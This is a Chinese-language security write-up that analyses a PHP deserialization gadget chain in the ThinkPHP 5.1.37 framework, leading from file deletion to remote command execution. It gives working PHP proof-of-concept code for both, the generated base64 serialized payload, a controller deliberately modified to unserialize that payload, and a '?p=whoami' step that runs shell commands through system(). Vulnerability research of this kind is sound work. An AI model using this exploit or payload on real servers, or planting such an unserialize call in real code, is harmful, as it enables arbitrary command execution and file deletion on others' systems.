纸上得来终觉浅，绝知此事要躬行。网上已经有很多分析的文章了，但是我还是决定按自己的理解写一下分析利用过程，化繁为简、深入浅出让它看起来更容易懂一些，降低理解的难度。

 **下载地址：**

应用项目：https://github.com/top-think/think

核心框架：https://github.com/top-think/framework

把framework修改为thinkphp放入到thinkphp5.1.37文件夹中这样整个框架就搭建好了

反序列化链涉及到的文件：

起点文件-> thinkphp\library\think\process\pipes\Windows.php

thinkphp\library\think\model\concern\Conversion.php

thinkphp\library\think\model\concern\ Attribute.php

thinkphp\library\think\model\concern\ RelationShip.php

thinkphp\library\think\Model.php

thinkphp\library\think\Pivot.php

终点文件-> thinkphp\library\think\Request.php

是不是觉得文件很多，头很大，那我们来简化一下

起点文件-> thinkphp\library\think\process\pipes\Windows.php

thinkphp\library\think\Pivot.php

终点文件-> thinkphp\library\think\Request.php

为什么这样写呢因为 Conversion、Attribute
和RelationShip是trait类，其代码可以复用，而model类复用了这三个文件的代码所以我们就可以把这四个文件看做一个文件，然而model类文件是abstract（抽象）类不能直接使用，pivot类继承了model类，所以pivot文件相当于这四个文件的一个集.合体。所以我们只用关注Windows.php、Pivot.php、Request.php这三个文件。

 **涉及到的方法：**

Windows.php 下的 __destruct()方法、removeFiles()

Conversion.php 下的__toString()方法、toJson()方法、toArray()方法

RelationShip.php 下的getRelation()方法

Attribute.php 下的getAttr()方法、getData()方法

Request.php 下的__call()方法、isAjax()方法、param()方法、input()方法、filterValue()方法

这其中Conversion.php、RelationShip.php、Attribute.php 下的方法可以理解为Pivot.php的方法

我们把这个利用链路划分为三个小目标：

> 1、利用Windows类激活__toString()魔术方法。
>
> 2、利用Pivot.类激活__call()魔术方法
>
> 3、利用Request类实现代码执行

 **利用链如下：**  
__destruct() —>removeFiles() —>_toString() —>toJson() —>toArray()
—>getRelation() —>getAttr() —>getData() —>__call() —>isAjax() —>param()
—>input() —>filterValue()

 **代码分析：**

Windows对象在进行反序列化操作时会执行析构方法__destruct()，然后调用了removeFiles方法在removeFiles方法中会判断$this->files是不是存在存在即删除，因此这里存在任意文件删除，我们只要在生成windowsdu对象时进行$this->file赋值为一个文件的路径，那么反序列化时就会删除这个文件。

>
>     public function __destruct()
>  
>     {
>  
>     $this->close();
>  
>     $this->removeFiles();
>  
>     }
>  
>     private function removeFiles()
>  
>     {
>  
>     foreach ($this->files as $filename) {
>  
>     if (file_exists($filename)) {
>  
>     @unlink($filename);
>  
>     }
>  
>     }
>  
>     $this->files = [];
>  
>     }
>
>  **poc任意文件删除:**
>  
>  
>     <?php
>  
>     namespace think\process\pipes;
>  
>     class Windows{
>  
>     private $files = [];
>  
>     public function __construct(){
>  
>     $this->files=['d:/1.txt'];
>  
>     }
>  
>     }
>  
>     echo base64_encode(serialize(new Windows()));

在file_exists()函数中如果传入的参数是一个对象的话，那么就会把这个对象当做字符串，这样就会触发对象的__toString()魔术方法，而恰好在Conversion类中实现了这个方法（
**成功实现第一个小目标** ），在Conversion类的__toString中又调用了toJson方法、toJson中又调用了toArray方法、

>
>     public function __toString()
>  
>     {
>  
>     return $this->toJson();
>  
>     }
>  
>     public function toJson($options = JSON_UNESCAPED_UNICODE)
>  
>     {
>  
>     return json_encode($this->toArray(), $options);
>  
>     }
>  
>     // 追加属性（必须定义获取器）
>  
>     if (!empty($this->append)) {
>  
>     foreach ($this->append as $key => $name) {
>  
>     if (is_array($name)) {
>  
>     // 追加关联对象属性
>  
>     $relation = $this->getRelation($key);
>  
>     if (!$relation) {
>  
>     $relation = $this->getAttr($key);
>  
>     $relation->visible($name);
>  
>     }

在toArray中我们要控制$this->append的值不能为空数组，而且数组中的$name必须是一个数组，那么就会执行getRelation方法。所以这里呢我们在进行序列化时赋值$this->append=[‘aa’=>[]]那么$key=’aa’跟进getRelation方法。

>
>     public function getRelation($name = null)
>  
>     {//此处的$name='aa'
>  
>     if (is_null($name)) {
>  
>     return $this->relation;
>  
>     } elseif (array_key_exists($name, $this->relation)) {
>  
>     return $this->relation[$name];
>  
>     }
>  
>     return;
>  
>     }

在getRelation方法我们只要控制返回一个空值就好了；这就要求$name的值不能为null而且$name不是$this->relation这个数组中的一个键、$this->relation的值我们是可以控制的。当$relation值为假的时候那么就会执行getAttr方法,我们跟进getAttr方法。

>
>     public function getAttr($name, &$item = null)
>  
>     {
>  
>     try {
>  
>     $notFound = false;
>  
>     //此时方法中的$name=’aa’
>  
>     $value    = $this->getData($name);
>  
>     } catch (InvalidArgumentException $e) {
>  
>     $notFound = true;
>  
>     $value    = null;
>  
>     }

调用了getDate方法此时的参数$name=’aa’、继续跟进

>
>     public function getData($name = null)
>  
>     {
>  
>     if (is_null($name)) {
>  
>     return $this->data;
>  
>     } elseif (array_key_exists($name, $this->data)) {
>  
>     return $this->data[$name];
>  
>     } elseif (array_key_exists($name, $this->relation)) {
>  
>     return $this->relation[$name];
>  
>     }
>  
>     throw new InvalidArgumentException('property not exists:' .
> static::class . '->' . $name);
>  
>     }

getDate的返回值为$this->data[$name];
值$this->data的值是可控的我们可以在序列化时赋值$this->data=[‘aa’=>new
Request()];没错返回值是一个request对象，为什么要返回request对象呢?是因为request对象中实现了一个__call()魔术方法。

> if (!$relation) {
>
> $relation = $this->getAttr($key);
>
> $relation->visible($name);
>
> }

在这里$relation为一个request对象，request对象调用visible方法时，因为request对象没有visible方法就会激活__call魔术方法（成功实现第二个小目标），下面跟进request类的__call方法。

> public function __call($method, $args)
>
> {
>
> if (array_key_exists($method, $this->hook)) {
>
> array_unshift($args, $this);
>
> return call_user_func_array($this->hook[$method], $args);
>
> }
>
> throw new Exception('method not exists:' . static::class . '->' . $method);
>
> }

这里的call_user_func_array回调函数会调用$this->hook[$method] 中的方法来处理args

这里的$method=
’visible’在进行序列化时我们对$this->hook进行赋值$this->hook=[‘visible’=>[$this,isAjax]]
意思就是调用request类的isAjax方法来处理$args.跟进isAJax方法：

> public function isAjax($ajax = false)
>
> {
>
> $value = $this->server('HTTP_X_REQUESTED_WITH');
>
> $result = 'xmlhttprequest' == strtolower($value) ? true : false;
>
> if (true === $ajax) {
>
> return $result;
>
> }
>
> $result = $this->param($this->config['var_ajax']) ? true : $result;
>
> $this->mergeParam = false;
>
> return $result;
>
> }

这其中调用了param方法参数为$this->config['var_ajax'])
在进行序列化时我们对$this->config进行赋值$this->config=[‘var_ajax =>’p’]

> public function param($name = '', $default = null, $filter = '')
>
> {
>
> ……

//这里可以理解为$this->param=$_GET获取get传参。

> $this->param = array_merge($this->param, $this->get(false), $vars,
> $this->route(false));
>
> //此处$name=$this->config[‘var_ajax ]=‘p’
>
> return $this->input($this->param, $name, $default, $filter);
>
> }

我们跟进$this->get方法看一下

> public function get($name = '', $default = null, $filter = '')
>
> {
>
> if (empty($this->get)) {
>
> $this->get = $_GET;
>
> }
>
> return $this->input($this->get, $name, $default, $filter);
>
> }

其实就是把url中get传的值添加到$this->param数组里面。

随后调用了input方法，传参$data=$this->param，$name=’p’

> public function input($data = [], $name = '', $default = null, $filter = '')
>
> {
>
> ……
>
> $data = $this->getData($data, $name);
>
> // 解析过滤器
>
> $filter = $this->getFilter($filter, $default);
>
> if (is_array($data)) {
>
> array_walk_recursive($data, [$this, 'filterValue'], $filter);
>
> }
>
> }
>
> Input方法中调用了 $data = $this->getData($data, $name);我们查看一下getData方法
>
> protected function getData(array $data, $name)
>
> {
>
> foreach (explode('.', $name) as $val) {
>
> if (isset($data[$val])) {
>
> $data = $data[$val];
>
> } else {
>
> return;
>
> }
>
> }
>
> return $data;
>
> }

就是从参数$data中取得数组健为$name的值，所以$data=$data[$name]= $data[‘p’]

Input方法中调用$filter = $this->getFilter($filter, $default)跟进分析

> protected function getFilter($filter, $default)
>
> {
>
> if (is_null($filter)) {
>
> $filter = [];
>
> } else {
>
> $filter = $filter ?: $this->filter;
>
> if (is_string($filter) && false === strpos($filter, '/')) {
>
> $filter = explode(',', $filter);
>
> } else {
>
> $filter = (array) $filter;
>
> }
>
> }
>
> $filter[] = $default;
>
> return $filter;
>
> }

所以$filter=$this->filter并转为数组，我们在进行序列化的时候可以对其进行赋值.$filter=’system’所以这里返回的就是[‘system’]并作为filter参数传给filtervalue方法

后面的array_walk_recursive($data, [$this, 'filterValue'],
$filter)意思就是调用filtervalue方法对$data进行处理$filter是参数，跟进filterfalue方法查看一下

> private function filterValue(&$value, $key, $filters)
>
> {
>
> $default = array_pop($filters);
>
> foreach ($filters as $filter) {
>
> if (is_callable($filter)) {
>
> // 调用函数或者方法过滤
>
> $value = call_user_func($filter, $value);

call_user_func方法就是命令执行的终点，这里的$value=$this->param[‘p’]，$filter=[system]也就是说用system函数来执行$value,$value的值可以视为访问链接的时候提交的一个参数

/?p=whoami 最后执行的就是 system(‘whoami’)（ **实现第三个小目标** ），至此整改利用链构造完成。

 **代码执行POC如下：**

> <?php
>
> namespace think;
>
> class Model{
>
> //私有属性不能在子类中修改
>
> private $data=[];
>
> public function __construct(){
>
> $this->data=['aa'=>new Request];
>
> }
>
> }
>
> namespace think;
>
> class Request
>
> {
>
> protected $config = ['var_ajax' => 'p'];
>
> protected $filter='system';
>
> //必须初始化param变量为数组
>
> protected $param = [];
>
> protected $hook;
>
> public function __construct(){
>
> $this->hook=['visible'=>[$this,'isAjax']];
>
> }
>
> }
>
> namespace think\model;
>
> use think\Model;
>
> class Pivot extends Model{
>
> protected $append = ['aa'=>[]];
>
> }
>
> namespace think\process\pipes;
>
> use think\model\Pivot;
>
> class Windows
>
> {
>
> private $files = [];
>
> function __construct(){
>
> $this->files=[new Pivot()];
>
> }
>
> }
>
> echo base64_encode(serialize(new windows));

 **利用过程如下：**

1、把poc放到web服务器并进行访问生成payload

>
> TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czoyOiJhYSI7YTowOnt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6MjoiYWEiO086MTM6InRoaW5rXFJlcXVlc3QiOjQ6e3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MToicCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo4OiIAKgBwYXJhbSI7YTowOnt9czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo3O2k6MTtzOjY6ImlzQWpheCI7fX19fX19fQ==

2、把payload放到tp框架里并进行反序列化操作

> Thinkphp5.1.37/public/index.php文件  
> <?php
>
> namespace app\index\controller;
>
> class Index
>
> {
>
> public function index()
>
> {
>
>
> unserialize(base64_decode("TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czoyOiJhYSI7YTowOnt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6MjoiYWEiO086MTM6InRoaW5rXFJlcXVlc3QiOjQ6e3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MToicCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo4OiIAKgBwYXJhbSI7YTowOnt9czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo3O2k6MTtzOjY6ImlzQWpheCI7fX19fX19fQ=="));
>
> }
>
> public function hello($name = 'ThinkPHP5')
>
> {
>
> return 'hello,' . $name;
>
> }
>
> }

3、访问框架并提交参数p的值为你想执行的命令

![](https://image.3001.net/images/20210205/1612494275_601cb5c3d79d449d7f712.png!small)

